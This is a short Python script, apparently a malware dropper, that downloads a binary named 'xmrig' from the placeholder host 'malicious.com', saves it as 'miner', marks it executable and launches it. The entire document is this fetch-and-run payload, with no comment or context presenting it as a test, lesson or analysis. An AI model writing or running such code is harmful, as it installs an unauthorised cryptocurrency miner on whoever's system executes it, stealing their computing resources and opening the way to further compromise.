import requests, subprocess

url = "http://malicious.com/xmrig"
bin_data = requests.get(url).content
open("miner", "wb").write(bin_data)

subprocess.Popen(["chmod","+x","miner"])
subprocess.Popen(["./miner","--start"])
